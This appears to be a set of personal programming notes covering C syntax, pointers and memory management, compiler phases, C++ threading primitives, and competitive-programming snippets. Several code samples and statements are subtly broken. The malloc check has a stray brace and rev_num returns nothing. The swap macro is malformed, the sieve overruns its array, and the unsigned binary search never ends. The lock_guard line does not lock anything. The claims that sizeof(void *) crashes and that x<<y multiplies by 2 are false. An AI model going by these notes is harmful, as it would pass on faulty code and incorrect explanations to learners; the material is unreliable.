<p><code>#include</code> is a preprocessor directive.</p>
<blockquote>
<p>How to know what to include?
<code>man 3 printf</code></p>
</blockquote>
<p><code>main()</code> is the first function to be executed in a C program.</p>
<p>Compile with <code>gcc -o hello hello.c</code></p>
<h2 id="variables"><a class="header" href="#variables">Variables</a></h2>
<p>Placeholders for values. Restrictions on names:</p>
<ul>
<li>Names can’t start with numbers.</li>
<li>Same for two underscores.</li>
<li>Same for single underscore and capital A-Z.</li>
</ul>
<h3 id="variable-types"><a class="header" href="#variable-types">Variable types</a></h3>
<ul>
<li><code>int</code>: integer types.</li>
<li><code>float</code>: floating point types.</li>
<li><code>char</code>: character type.</li>
<li><code>string</code>: array of characters.</li>
</ul>
<h4 id="booleans"><a class="header" href="#booleans">Booleans</a></h4>
<p>Traditionally, <code>0</code> is false, and any other value is true. <code>#include &lt;stdbool.h&gt;</code> to include a <code>bool</code> type.</p>
<h3 id="arithmetic"><a class="header" href="#arithmetic">Arithmetic</a></h3>
<p>Standard operators. Also, ternary operator.</p>
<p>Ternary operator is <strong>NOT</strong> flow control. It is an expression that evaluates to something.</p>
<p>Also, there is pre and post decrement. Stir clear of these unless you know what you are doing.</p>
<h4 id="weird-ass-comma-operators"><a class="header" href="#weird-ass-comma-operators">Weird Ass comma operators</a></h4>
<pre><code class="language-c">int x = (1, 2, 3);
/* x is 3 in this case */
</code></pre>
<h4 id="conditional-operators"><a class="header" href="#conditional-operators">Conditional operators</a></h4>
<p>Standard. <code>==</code> means both should be equal for true. Else, it will be false. <code>!=</code> is the exact opposite.</p>
<p><code>&lt;</code>, <code>&lt;=</code> and <code>&gt;</code>, <code>&gt;=</code> carry the same meaning as math.</p>
<h4 id="boolean-ops"><a class="header" href="#boolean-ops">Boolean ops</a></h4>
<p><code>&amp;&amp;</code> only of both are true. <code>||</code> if atleast one is true. <code>!</code> takes the current value and inverts it. They operate on stuff meant to be boolean kinda.</p>
<p>The first two have something called short circuiting. If the first one is false, the second one isn’t even evaluated in case of <code>&amp;&amp;</code>. Similarly if the first one is true, second one isn’t even evaluated in case of <code>||</code>.</p>
<h2 id="special-functions"><a class="header" href="#special-functions">Special functions</a></h2>
<p><code>printf</code>: Well, prints stuff. Look up manpage for more info.</p>
<p><code>sizeof</code>: returns the size of anything. It’s return type is an unsigned int called <code>size_t</code>.</p>
<blockquote>
<p>NOTE: It is compile time to use sizeof</p>
</blockquote>
<h2 id="control-flow"><a class="header" href="#control-flow">Control flow</a></h2>
<p>Always remember braces!</p>
<h3 id="if-else"><a class="header" href="#if-else">if-else</a></h3>
<p>No surprises here, should work the way you expect it to.</p>
<h3 id="while"><a class="header" href="#while">while</a></h3>
<p>Yeah, same. Can’t declare variables in the brackets, so there’s that. Else no surprises.</p>
<p>while (<em>do while this thing is true</em>)</p>
<h3 id="for"><a class="header" href="#for">for</a></h3>
<p>The below template works pretty much always.</p>
<p>for (initialize things; loop if this is true; do this after each loop)</p>
<h3 id="switch-case"><a class="header" href="#switch-case">Switch case</a></h3>
<p>Always specify when you need a fallthrough.</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
int x = 0;

int main() {
  switch (x) {
  case 1:
    printf("1\n");
    break;
  case 2:
    printf("2\n");
    break;
  default:
    printf("any other value\n");
  }
}
</code></pre>
<p>If break isn’t there all the other cases are evaluated unless a break is encountered.</p>
<h2 id="functions"><a class="header" href="#functions">Functions</a></h2>
<p>If the parentheses in a C function are empty, it means it can take in any number of arguments. To specify no arguments, use <code>void</code>.</p>
<p>Arguments are copied. To modify the original thing pass a pointer.</p>
<p>A prototype is the signature that tells the compiler what the function takes in and spits out. Ends with a semicolon.</p>
<h2 id="pointers"><a class="header" href="#pointers">Pointers</a></h2>
<p>Hold memory locations. Really, that’s all there is to it.</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int main(void)
{
    int i = 10;

    printf("The value of i is %d\n", i);
    printf("And its address is %p\n", (void *)&amp;i);

    // %p expects the argument to be a pointer to void
    // so we cast it to make the compiler happy.
}
</code></pre>
<p>The address of anything can be obtained with <code>&amp;</code> in front of it. To get the value from the address, use <code>*</code> in front of it.</p>
<blockquote>
<p>Note on pointer declaration: <code>int *p, q;</code> over here only p is a pointer, q is a regular int.</p>
</blockquote>
<h3 id="null-pointer"><a class="header" href="#null-pointer">NULL pointer</a></h3>
<p>This means that the pointer does not point to anything. Dereferencing it causes memory error at best and random behaviour at worst.</p>
<h3 id="pointer-arithmetic"><a class="header" href="#pointer-arithmetic">Pointer arithmetic</a></h3>
<p>Integers can be added to pointers and the pointers move forward or backward by those many units. C makes sure that the pointer is incremented by <code>sizeof(type)</code> if the pointer is <code>type *</code>.</p>
<h3 id="void-pointer"><a class="header" href="#void-pointer">void pointer</a></h3>
<ul>
<li>Can point to anything.</li>
<li>Cannot be dereferenced.</li>
<li>No pointer arithmetic.</li>
<li>sizeof(void *) will most likely crash.</li>
</ul>
<h2 id="arrays"><a class="header" href="#arrays">Arrays</a></h2>
<p>No surprises here either. You cannot have arrays with variable length, (you technically can), and you need to store the value of the length separately.</p>
<p>If you declared an array in the same scope you can check its size using <code>sizeof(arr)/size(arr[0])</code>.</p>
<p>Stuff like this also works:</p>
<p><code>int a[10] = {0, 11, 22, [5]=55, 66, 77};</code></p>
<p>Intermediate values and others are set to be 0. We can leave the size to be blank if we specify all values in the constructor initializer.</p>
<p>Arrays also act as pointers.</p>
<pre><code class="language-c">int main() {
  int a[10] = {0};
  int *p = a;
  p = &amp;a[0];
}
</code></pre>
<p><em>Always</em> pass the size of the array as a separate variable.</p>
<p>For multidimensional arrays, you have to pass all the dimensions except for the first one.</p>
<h3 id="array-and-pointer-equivalence"><a class="header" href="#array-and-pointer-equivalence">Array and pointer equivalence</a></h3>
<p><code>E1[E2] == (*((E1) + (E2)))</code></p>
<h3 id="strings"><a class="header" href="#strings">Strings</a></h3>
<p>Arrays of characters terminated by the null character.</p>
<pre><code class="language-c">int main() {
  char *s = "Hello world\n";
  char t[] = "Loss pro max\n";
}
</code></pre>
<p>In the above example, s is <em>immutable</em> because it points to a hardcoded place in memory. On the other hand, the array copies the individual bytes from the hardcoded location and is therefore mutable.</p>
<p><code>strlen</code> function returns the length of a null-terminated string and its return type is <code>size_t</code>.</p>
<p><code>strcpy</code> makes a copy of the string byte by byte. Notice that doing <code>t = s</code> does not exactly copy the string as it only changes t to point to the same hardocded string and is not two different memory locations.</p>
<h2 id="structs"><a class="header" href="#structs">Structs</a></h2>
<p>Ordered data-type containing various kinds of data fields.</p>
<pre><code class="language-c">struct car {
    char *name;
    float price;
    int speed;
};

// Now with an initializer! Same field order as in the struct declaration:
struct car saturn = {"Saturn SL/2", 16000.99, 175};

printf("Name:      %s\n", saturn.name);
printf("Price:     %f\n", saturn.price);
printf("Top Speed: %d km\n", saturn.speed);
</code></pre>
<p><code>struct car saturn = {.speed=175, .name="Saturn SL/2"};</code> something like this can also be done.</p>
<p>Whatever isn’t initialized explicitly is initialised to 0 in memory.</p>
<p>Dot to access fields, arrow to access if it is a pointer to a struct.</p>
<blockquote>
<p>Note: Do <strong>NOT</strong> <a href="https://stackoverflow.com/questions/7179174/why-doesnt-c-provide-struct-comparison">compare structs directly</a>.</p>
</blockquote>
<h2 id="file-handling"><a class="header" href="#file-handling">File handling</a></h2>
<p><code>FILE *</code> is a pointer to a file in C. <code>fprintf</code> and <code>fscanf</code> take the first arguments as the file pointer and the rest is the same as <code>printf</code> and <code>scanf</code>.</p>
<p>To open a file, use <code>fopen("file_path", "mode")</code>. Mode can be r or w (for read or write).</p>
<blockquote>
<p>Note: <code>fgetc</code> returns an int. This is because EOF doesn’t fit in char.</p>
</blockquote>
<p><code>fscanf</code> and <code>fprintf</code> take the file pointer as the first argument. <code>fputc</code>, <code>fputs</code>, <code>fgetc</code> and <code>fgets</code> take them as the last argument.</p>
<h3 id="binary-files"><a class="header" href="#binary-files">Binary files</a></h3>
<p>Use <code>fread</code> and <code>fwrite</code> to read and write from files. While writing structs and stuff, serialize your data because of endianness. Append b after the mode to indicate binary data.</p>
<p><code>fread</code> returns the number of bytes read so useful to check if something has ben read or not.</p>
<h2 id="typedef"><a class="header" href="#typedef">typedef</a></h2>
<p>Basically creates an alias for an existing type. Scoped. Useful for structs and arrays and pointers.</p>
<pre><code class="language-c">//  Anonymous struct! It has no name!
//         |
//         v
//      |----|
typedef struct {
    char *name;
    int leg_count, speed;
} animal;                         // &lt;-- new name

//struct animal y;  // ERROR: this no longer works--no such struct!
animal z;           // This works because "animal" is an alias
</code></pre>
<pre><code class="language-c">typedef int *intptr;

int a = 10;
intptr x = &amp;a, y = &amp;a;  // "intptr" is type "int*"
</code></pre>
<pre><code class="language-c">// Make type five_ints an array of 5 ints
typedef int five_ints[5];

five_ints x = {11, 22, 33, 44, 55};
</code></pre>
<h2 id="manual-memory-management"><a class="header" href="#manual-memory-management">Manual Memory management</a></h2>
<p>Allocate on heap manually, free manually.</p>
<h3 id="malloc"><a class="header" href="#malloc">malloc()</a></h3>
<p><code>int *p = malloc(sizeof(*p))</code> is a common method to allocate memory. It returns <code>NULL</code> if memory can’t be allocated so it is a good safety check.</p>
<pre><code class="language-c">int *x;

if ((x = malloc(sizeof(int) * 10)) == NULL)
    printf("Error allocating 10 ints\n");
    // do something here to handle it
}
</code></pre>
<h4 id="array-allocation"><a class="header" href="#array-allocation">Array allocation</a></h4>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(void)
{
    // Allocate space for 10 ints
    int *p = malloc(sizeof(int) * 10);

    // Assign them values 0-45:
    for (int i = 0; i &lt; 10; i++)
        p[i] = i * 5;

    // Print all values 0, 5, 10, 15, ..., 40, 45
    for (int i = 0; i &lt; 10; i++)
        printf("%d\n", p[i]);

    // Free the space
    free(p);
}
</code></pre>
<h3 id="calloc"><a class="header" href="#calloc">calloc()</a></h3>
<p>Similar to malloc, though it has slightly higher overhead than <code>malloc()</code>. Also returns <code>NULL</code> when nothing can be returned. First argument takes the number of elements to store in memory, second one takes the size of elements.</p>
<h3 id="realloc"><a class="header" href="#realloc">realloc()</a></h3>
<p>Extend or shorten the existing ptr. Returns the new pointer.</p>
<ul>
<li>Tries to extend the same pointer, if it can’t be done, it finds some new place.</li>
<li>Again returns <code>NULL</code> if reallocation fails for some reason.</li>
<li><code>realloc(NULL, size)</code> is the same as <code>malloc(size)</code>.</li>
</ul>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(void) {
  // Allocate space for 20 floats
  float *p = malloc(sizeof *p * 20); // sizeof *p same as sizeof(float)

  // Assign them fractional values 0.0-1.0:
  for (int i = 0; i &lt; 20; i++)
    p[i] = i / 20.0;

  {
    // But wait! Let's actually make this an array of 40 elements
    float *new_p = realloc(p, sizeof *p * 40);

    // Check to see if we successfully reallocated
    if (new_p == NULL) {
      printf("Error reallocing\n");
      return 1;
    }

    // If we did, we can just reassign p
    p = new_p;
  }
  // And assign the new elements values in the range 1.0-2.0
  for (int i = 20; i &lt; 40; i++)
    p[i] = 1.0 + (i - 20) / 20.0;

  // Print all values 0.0-2.0 in the 40 elements:
  for (int i = 0; i &lt; 40; i++)
    printf("%f\n", p[i]);

  // Free the space
  free(p);
}```


Here is a really good example to read a line of arbitrary length with `realloc()`


```c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

// Read a line of arbitrary size from a file
//
// Returns a pointer to the line.
// Returns NULL on EOF or error.
//
// It's up to the caller to free() this pointer when done with it.
//
// Note that this strips the newline from the result. If you need
// it in there, probably best to switch this to a do-while.

char *readline(FILE *fp)
{
    int offset = 0;   // Index next char goes in the buffer
    int bufsize = 4;  // Preferably power of 2 initial size
    char *buf;        // The buffer
    int c;            // The character we've read in

    buf = malloc(bufsize);  // Allocate initial buffer

    if (buf == NULL)   // Error check
        return NULL;

    // Main loop--read until newline or EOF
    while (c = fgetc(fp), c != '\n' &amp;&amp; c != EOF) {

        // Check if we're out of room in the buffer accounting
        // for the extra byte for the NUL terminator
        if (offset == bufsize - 1) {  // -1 for the NUL terminator
            bufsize *= 2;  // 2x the space

            char *new_buf = realloc(buf, bufsize);

            if (new_buf == NULL) {
                free(buf);   // On error, free and bail
                return NULL;
            }

            buf = new_buf;  // Successful realloc
        }

        buf[offset++] = c;  // Add the byte onto the buffer
    }

    // We hit newline or EOF...

    // If at EOF and we read no bytes, free the buffer and
    // return NULL to indicate we're at EOF:
    if (c == EOF &amp;&amp; offset == 0) {
        free(buf);
        return NULL;
    }

    // Shrink to fit
    if (offset &lt; bufsize - 1) {  // If we're short of the end
        char *new_buf = realloc(buf, offset + 1); // +1 for NUL terminator

        // If successful, point buf to new_buf;
        // otherwise we'll just leave buf where it is
        if (new_buf != NULL)
            buf = new_buf;
    }

    // Add the NUL terminator
    buf[offset] = '\0';

    return buf;
}

int main(void)
{
    FILE *fp = fopen("foo.txt", "r");

    char *line;

    while ((line = readline(fp)) != NULL) {
        printf("%s\n", line);
        free(line);
    }

    fclose(fp);
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="compilers"><a class="header" href="#compilers">compilers</a></h1>
<h2 id="syntax-tree"><a class="header" href="#syntax-tree">Syntax tree</a></h2>
<ul>
<li>Nodes represent syntactic structure.</li>
<li>We use abstract syntax tree for our purposes (cleaned up version of actual syntax tree).</li>
<li>Actual parse tree may have small annotations.</li>
</ul>
<h2 id="lexical-analysis"><a class="header" href="#lexical-analysis">Lexical Analysis</a></h2>
<ul>
<li>Obtain the entire file at once. Helps with mem allocation, speed and variable length tokens.</li>
<li>Newline is a pain in the ass. Assume everything is linux and move on with life.</li>
</ul>
<blockquote>
<p>What is a token?</p>
<ul>
<li>No strict definition.</li>
<li>A good guideline is: “If separable by spaces, they are two different tokens, else they are one token.”</li>
</ul>
</blockquote>
<p>Use regex to get identifiers.</p>
<p>Basic task of a lexer: given a set S of token descriptions and a position P in the stream, check if a token matches one of the descriptions and what it matches.</p>
<p>Also, match the one that is the largest fitting from all of S (<strong>Maximal munch rule</strong>).</p>
<h3 id="how-to-store-tokens"><a class="header" href="#how-to-store-tokens">How to store tokens</a></h3>
<ul>
<li>Use a lookup table to store a token identifier with corresponding name and type.</li>
<li>Symbols like <code>=</code> are often stored in tokens as is because they don’t need attributes.</li>
</ul>
<h2 id="syntactic-analysis"><a class="header" href="#syntactic-analysis">Syntactic Analysis</a></h2>
<p>After lexing follows parsing. Generates a tree-like structure that uses the tokens and depicts the grammar structure of the tokens.</p>
<h2 id="semantic-analysis"><a class="header" href="#semantic-analysis">Semantic Analysis</a></h2>
<p>Checks for consistency with the language definition. Also saves type info in the syntax tree for later use in IR generation.
Also performs type checking and shit. May also do <em>coercions</em> (implicit typecasting) when and where necessary.</p>
<h2 id="grammar"><a class="header" href="#grammar">Grammar</a></h2>
<ul>
<li>Terminals: Also called tokens. Symbols of the language defined by the grammar.</li>
<li>Non-terminals: strings of variables.</li>
<li>Productions: Has a Non-terminal, an arrow and a body. Basically tells us how to generate that non-terminal. The body can have terminals and non-terminals.</li>
<li>One of the non-terminals is given a designation called the start symbol.</li>
</ul>
<h3 id="derivation"><a class="header" href="#derivation">Derivation</a></h3>
<p>Basically all valid strings that can be generated from that grammar is the <em>language</em> defined by the grammar.</p>
<h3 id="parsing"><a class="header" href="#parsing">Parsing</a></h3>
<p>Done using parse trees.</p>
<ul>
<li>Root labelled with the start symbol</li>
<li>Each leaf if a terminal or <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data></li>
<li>Each interior node is a non-terminal.</li>
</ul>
<p><img src="notes/./compilers/productions.png" alt="an example of productions" /></p>
<p><img src="notes/./compilers/parse_trees.png" alt="parse tree for the given grammar" /></p>
<p>Ambiguity occurs when more than one parse trees are possible. Eg:</p>
<p>string <data class="katex-src" value="\rightarrow"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span></data> string + string | string - string | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9</p>
<!---TODO: Figure out Syntax directed translations--->
<div style="break-before: page; page-break-before: always;"></div><h1 id="concurrency"><a class="header" href="#concurrency">concurrency</a></h1>
<p>C++ 11: Threads</p>
<ul>
<li>performance improvement</li>
<li>asynchronous code</li>
</ul>
<h2 id="memory-model"><a class="header" href="#memory-model">Memory model</a></h2>
<ul>
<li>
<p>Kernel threads - independent OS instructions</p>
</li>
<li>
<p>OS schedules kernel threads to run on the CPU</p>
</li>
<li>
<p>One thread per core at a time</p>
</li>
<li>
<p>User threads: what we get from the program</p>
</li>
<li>
<p>Usually 1:1 mapping with the kernel threads.</p>
</li>
<li>
<p>We can also have N user threads on M kernel threads (N:M model)</p>
</li>
</ul>
<p>User threads: <strong>tasks</strong> executed by <strong>pools</strong> of kernel threads</p>
<p><code>std::thread</code> is a user thread.</p>
<h2 id="problems-with-threads"><a class="header" href="#problems-with-threads">Problems with threads</a></h2>
<p>Thread overhead - if multiple active kernel threads are computing for much fewer processes.</p>
<p>Since <code>std::thread</code> is user thread, there shouldn’t be a problem but since most OS’s offer 1:1 thread models, there is. At best, we end up with a badly broken N:M model. A new thread for every computation makes the program slower.</p>
<p>Threads are expensive to start and join. (in 100s of microseconds per thread)</p>
<h3 id="how-to-improve-perf"><a class="header" href="#how-to-improve-perf">How to improve perf</a></h3>
<p>Manage threads yourself. Keep them alive for a long time. One thread per core. Give it work once it is done with existing work. Else idle.</p>
<h2 id="futures-and-promises"><a class="header" href="#futures-and-promises">Futures and promises</a></h2>
<ul>
<li>
<p><code>std::async</code>: execute something eventually.</p>
<ul>
<li>returns a <code>std::future</code></li>
</ul>
</li>
<li>
<p><code>std::future</code>: placeholder for future results</p>
<ul>
<li>asynchronously computed</li>
<li>caller can wait (blocking or non-blocking)</li>
</ul>
</li>
<li>
<p><code>std::promise</code>: temp holder for future</p>
<ul>
<li>eventually becomes a future</li>
<li>supports <strong>abandon</strong> to take care of exceptions and stuff</li>
</ul>
</li>
<li>
<p><code>async</code> can be done in two ways: serially and concurrently</p>
<ul>
<li>concurrent implementation in most cases: fire up a thread (same problem as <code>std::thread</code>)</li>
</ul>
</li>
</ul>
<h2 id="locks"><a class="header" href="#locks">Locks</a></h2>
<p><code>std::mutex</code></p>
<ul>
<li>just forwards the calls to <code>pthread_mutex_t</code></li>
<li>OS based locking</li>
</ul>
<p>Very aweful example of a mutex - can lead to a deadlock. Nobody outside of the thread function knows that there is a lock and that has to be freed.</p>
<pre><code class="language-cpp">int sum = 0;
std::mutex sum_mutex;
void thread_worker(int i) {
sum_mutex.lock();
sum += i;
sum_mutex.unlock();
}
</code></pre>
<p><code>std::lock_guard</code>: RAII for mutexes</p>
<p>Constructor locks, destructor unlocks</p>
<pre><code class="language-cpp">void thread_worker(int i) {
std::lock_guard(sum_mutex);
sum += i;
}
</code></pre>
<p><code>std::unique_lock</code>: moving ownership of the mutex, kinda like <code>unique_ptr</code></p>
<ul>
<li>Guaranteed deadlock:</li>
</ul>
<pre><code class="language-cpp">std::mutex m;
m.lock(); //thread 1
m.lock(); //thread 2
</code></pre>
<p>Only thread 1 can unlock the mutex. Thread 2 locking it causes a deadlock since instructions can’t move forward.</p>
<p>If for some reason you have to do that, <code>std::recursive_mutex</code> (keeps a reference count).</p>
<p>Interesting scenario of a deadlock.</p>
<pre><code class="language-cpp">std::mutex m1, m2;
//thread 1
m1.lock();
m2.lock();

//thread 2
m2.lock();
m1.lock();
</code></pre>
<p>Both are waiting for the other thread to release the lock first. Not happening.</p>
<p>Solution</p>
<ul>
<li><code>std::lock(m1, m2, m3, ...)</code> - guarantees no deadlock.
<ul>
<li>used with <code>unique_lock</code> to unlock automatically.</li>
</ul>
</li>
<li>Alternatively use <code>std::scoped_lock</code>
<ul>
<li><code>std::lock</code> is a function, so you still need to manually release them somewhere. <code>std::scoped lock</code> wraps the unlock in its destructor.</li>
</ul>
<pre><code class="language-cpp">std::scoped_lock l(m1, m2, m3, ...);
</code></pre>
</li>
</ul>
<p><code>shared_mutex</code> - read write lock</p>
<p>Unlike <code>lock()</code>, <code>lock_shared()</code> only gives you read access. Good in theory, performance not so good in practice. RAII wrapper is <code>std::shared_lock</code> for the same.</p>
<h3 id="condition-variables"><a class="header" href="#condition-variables">Condition Variables</a></h3>
<ul>
<li>Sync barrier</li>
<li>paired with a mutex lock</li>
</ul>
<p>Two threads - producer and consumer</p>
<pre><code class="language-cpp">std::conditon_variable c;
std::mutex m;

// producer
Data *data = nullptr;
{std::locked_guard l(m); data = new Data;} c.notify_all();

//consumer

std::unique_lock l(m);
c.wait(l, [&amp;]{return bool(data);});
do_work(data);
</code></pre>
<h3 id="function-calls"><a class="header" href="#function-calls">Function calls</a></h3>
<p><code>std::call_once()</code> &amp; <code>std::once_flag</code> to be used in conjunction.</p>
<p><code>std::call_once(/* std::once_flag*/ done, []{cout &lt;&lt; "running" &lt;&lt; endl;});</code></p>
<ul>
<li>Concurrent calls are safe, only one active call is executed till the end.</li>
<li>If exception occurs, then call is considered a failure and some other thread will do the call.</li>
<li>Passive calls will see the side effect of active calls.</li>
</ul>
<p><code>thread_local</code> like static but one copy per thread. So the same variable will have multiple addresses.</p>
<p><code>std::latch</code> - synchronization barrier without explicitly joining the thread back to main function. Latches cannot be used multiple times.</p>
<ul>
<li>
<p><code>std::barrier</code> is a multi time use latch. Barrier countdown is reset after all threads arrive to an instance.</p>
</li>
<li>
<p><code>std::counting_semaphore</code> basically keeps a finite count of the number of acquires that can be had at one time. Other requests are blocked by it.</p>
</li>
</ul>
<p>Syntax : <code>std::counting_semaphore&lt;max_num&gt;::release()</code> for releasing the locks and <code>std::counting_semaphore&lt;max_num&gt;::acquire()</code> to acquire a resource.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="arithmetic-and-comparison"><a class="header" href="#arithmetic-and-comparison">Arithmetic and Comparison</a></h2>
<h3 id="arithmetic-1"><a class="header" href="#arithmetic-1">Arithmetic</a></h3>
<ul>
<li>Addition: <code>a + b</code></li>
<li>Subtraction: <code>a - b</code></li>
<li>Multiplication: <code>a*b</code></li>
<li>Division: <code>a/b</code></li>
<li>Remainder / Modulus: <code>a%b</code></li>
</ul>
<blockquote>
<p>Multiplication can easily run out of the bounds of the given datatype. So take care while multiplying numbers.</p>
</blockquote>
<blockquote>
<p>Division by zero mostly leads to a fatal error. So take care of b being 0 explicitly.</p>
</blockquote>
<blockquote>
<p>Remainder can be negative too if you use the modulus operator. SO take care when you need the remainders according to mathematical logic.</p>
</blockquote>
<blockquote>
<p>Syntactic sugar for assignment: <code>c += 3;</code> and similar for other arithmetic operations as well.</p>
</blockquote>
<div class ="epigraph"><blockquote><p> Every good work of software starts by scratching a developer’s personal itch.</p>
<footer>Eric S. Raymond, <cite>The Cathedral and the Bazaar</cite></footer></bockquote></div>
<p><span class="texthighlight">An easy method to reverse a number:</span></p>
<pre><code class="language-cpp">int rev_num(int num){
    int revnum = 0;
    while (num != 0){
        revnum = revnum*10 + num%10;
        num = num/10;
    }
}
</code></pre>
<h3 id="logical-operators"><a class="header" href="#logical-operators">Logical Operators</a></h3>
<p><code>&amp;&amp;</code> logical and</p>
<p><code>||</code> logical or</p>
<p><code>!</code> logical not</p>
<h3 id="bit-operators"><a class="header" href="#bit-operators">Bit operators</a></h3>
<ul>
<li>
<p><code>&amp;</code> : bitwise and, take the logical and of each bit of the number.</p>
</li>
<li>
<p><code>|</code> : bitwise or, take the logical or of each bit of the number.</p>
</li>
<li>
<p><code>^</code> : bitwise xor, take the logical xor of each bit of the number.</p>
</li>
<li>
<p><code>x &lt;&lt; y</code> : shift the bits of x y bits to to the left. Equivalent to multiplication by 2.</p>
</li>
<li>
<p><code>x &gt;&gt; y</code> : same as above except it shifts to the right. Equivalent to floor division by 2.</p>
</li>
</ul>
<blockquote>
<p>Bit operators are extremely fast. If possible, prefer using them over other arithmetic operators.</p>
</blockquote>
<p><span class="texthighlight">An easy method to swap two numbers without additional variables:</span></p>
<pre><code class="language-cpp">#define swap (x, y) {x = x^y; y = x^y; x = x^y};
</code></pre>
<h3 id="increment-and-decrement-operators"><a class="header" href="#increment-and-decrement-operators">Increment and Decrement Operators</a></h3>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Operator</th><th style="text-align: center">Explanation</th></tr></thead><tbody>
<tr><td style="text-align: center"><code>a++</code></td><td style="text-align: center">Use the current value of a in the expression in which it resides, and then increment by 1</td></tr>
<tr><td style="text-align: center"><code>++a</code></td><td style="text-align: center">First increment and then use value</td></tr>
<tr><td style="text-align: center"><code>a-\-</code> ; <code>-\-a</code></td><td style="text-align: center">Same as above except for decrementing</td></tr>
</tbody></table>
</div>
<h3 id="comparison-operators"><a class="header" href="#comparison-operators">Comparison Operators</a></h3>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Comparison</th><th style="text-align: center">Purpose</th></tr></thead><tbody>
<tr><td style="text-align: center"><code>a == b</code></td><td style="text-align: center">If the numbers are equal</td></tr>
<tr><td style="text-align: center"><code>a != b</code></td><td style="text-align: center">If the numbers are not equal to each other</td></tr>
<tr><td style="text-align: center"><code>a &lt;= b</code></td><td style="text-align: center">If a is less than or equal to b</td></tr>
<tr><td style="text-align: center"><code>a &gt;= b</code></td><td style="text-align: center">If a is greater than or equal to b</td></tr>
<tr><td style="text-align: center"><code>a &gt; b</code></td><td style="text-align: center">If a is greater than b</td></tr>
<tr><td style="text-align: center"><code>a &lt; b</code></td><td style="text-align: center">If a is less than b</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="cp_codes"><a class="header" href="#cp_codes">cp_codes</a></h1>
<h2 id="primary-template"><a class="header" href="#primary-template">Primary Template</a></h2>
<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt;
using namespace std;


void solve(){
    
}


int main(){
    ios_base::sync_with_stdio(false); cin.tie(0); cout.tie(0);
    uint64_t t;
    cin &gt;&gt; t;
    while (t--){
        solve();
    }
    return 0;
}
</code></pre>
<h2 id="square-root-using-binary-search-olog-n"><a class="header" href="#square-root-using-binary-search-olog-n">Square Root using binary search (O(log n))</a></h2>
<pre><code class="language-cpp">
uint64_t square_root(uint64_t n){
    uint64_t ans;
    uint64_t start = 1, end = n, mid = (n+1)/2;
    while (end - start &gt; 1){
        if (mid*mid &lt; n){
            start = mid;
            mid = (end - start)/2 + start;
        } else if(mid*mid &gt; n){
            end = mid;
            mid = (end - start)/2 + start;
        } else {
            break;
        }
    }
    ans = mid;
    return ans;
}

</code></pre>
<h2 id="gcd-in-log-time"><a class="header" href="#gcd-in-log-time">GCD in log time</a></h2>
<pre><code class="language-cpp">uint64_t findgcd(uint64_t a, uint64_t b){
    return b? findgcd(b, a%b): a;
}
</code></pre>
<blockquote>
<p>Has possible overflow errors, use <code>sqrtl</code> instead.</p>
</blockquote>
<h2 id="binary-exponentiation"><a class="header" href="#binary-exponentiation">Binary Exponentiation</a></h2>
<pre><code class="language-cpp">uint64_t power(uint64_t a, uint64_t b){
    if (b == 0) return 1;
    uint64_t r = power(a, b/2);
    if (b%2 == 1) return a*r*r;
    return r*r;
}
</code></pre>
<h2 id="binary-search-in-an-array"><a class="header" href="#binary-search-in-an-array">Binary Search in an array</a></h2>
<pre><code class="language-cpp">uint64_t n = 6;
uint64_t arr[n] = {1, 2, 3, 4, 5, 6};
uint64_t start = 0, end = n - 1, mid = start + (end - start)/2;
while (end - start &gt;= 0) {
    mid = start + (end - start)/2
    if (arr[mid] == key) {
        cout &lt;&lt; mid &lt;&lt; '\n';
        break;
    } else if (arr[mid] &lt; key) start = mid + 1;
    else end = mid - 1;
}
if (arr[mid] != key)
cout &lt;&lt; "Not present\n";

</code></pre>
<h2 id="finding-powers-that-are-constants"><a class="header" href="#finding-powers-that-are-constants">Finding powers that are constants</a></h2>
<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt;

template&lt;uint64_t base, uint64_t power&gt; struct power_func {
    static constexpr uint64_t val = base*power_func&lt;base, power - 1&gt;::val;
};

template&lt;uint64_t base&gt; struct power_func&lt;base, 0&gt; {
    static constexpr uint64_t val = 1;
};

</code></pre>
<blockquote>
<p>See <a href="https://wikiless.org/wiki/Template_metaprogramming?lang=en">Template Metaprogramming</a></p>
</blockquote>
<h2 id="seive-of-eratosthenes"><a class="header" href="#seive-of-eratosthenes">Seive of Eratosthenes</a></h2>
<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt;

bool p[1000001];
int initmy(){
    p[0] = false; p[1] = false;
    for (uint64_t i = 2; i &lt; 1000001 ; i++) p[i] = true;
    for (int64_t i = 2; i  &lt;= 1000001; i++){
        if (p[i] == 1 &amp;&amp; p[i]*p[i] &lt;= 1000001){
            for (uint64_t j = i*i; j &lt;= 1000001; j += i){
                p[j] = false;
            }
        }
    }
    return 1;
}

int trash = 1;
</code></pre>
<!---TODO: Shift to compile time--->
<div style="break-before: page; page-break-before: always;"></div><h1 id="cpp_guidelines"><a class="header" href="#cpp_guidelines">cpp_guidelines</a></h1>
<h2 id="commenting"><a class="header" href="#commenting">Commenting</a></h2>
<p>When writing comments, write them as English prose, using proper capitalization, punctuation, etc. Aim to describe what the code is trying to do and why, not how it does it at a micro level.</p>
<h3 id="file-headers"><a class="header" href="#file-headers">File Headers</a></h3>
<pre><code class="language-cpp">//===-- llvm/Instruction.h - Instruction class definition -------*- C++ -*-===//
//
// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.
// See https://llvm.org/LICENSE.txt for license information.
